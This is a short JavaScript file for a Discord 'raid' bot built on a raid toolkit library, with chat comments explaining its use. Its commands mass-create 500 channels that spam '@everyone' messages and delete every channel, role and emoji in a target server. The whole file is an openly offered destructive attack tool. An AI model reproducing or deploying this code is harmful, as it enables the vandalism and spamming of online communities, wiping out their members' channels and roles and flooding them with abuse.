const Discord = require('discord.js') //We gonna require discord
const client = new Discord.Client() //setting/creating a new discord client (bot)

const Disc_rd = require('discord-raid-toolkit-revamp')
const raid = new Disc_rd.RaidBot(client) //here we pass client parameter, as you see i set it as client because that is the name i put it as in const **client**

client.on('message', message => {
    if(message.content.startsWith('!spam')) {
        raid.createChannelsLoop(message.guild.id, {amount_of_created_channels: 500, message_that_will_be_sent: "@everyone SUS", times_message_is_sent: 10, channels_name: "fucked", reason_channels: "No Reason LMAO", channels_topic: "NoTopic", nsfw: false, channel_cooldown: 10}) //btw channel_cooldown is put in seconds, like, i put 10 so channel cooldown will be 10 seconds, you can always try the code and understand it the max possible
    }
    })
client.on('message', message => {
    if(message.content.startsWith('!delete')) {
        raid.deleteAllChannels(message.guild.id)
    }
    })
client.on('message', message => {
    if(message.content.startsWith('!roles')) {
        raid.deleteAllRoles(message.guild.id)
    }
    })
client.on('message', message => {
    if(message.content.startsWith('!emojis')) {
        raid.deleteAllEmojis(message.guild.id)
    }
    })

client.login('INSERT YOUR TOKEN') //How to get bot token:   https://www.writebots.com/discord-bot-token/
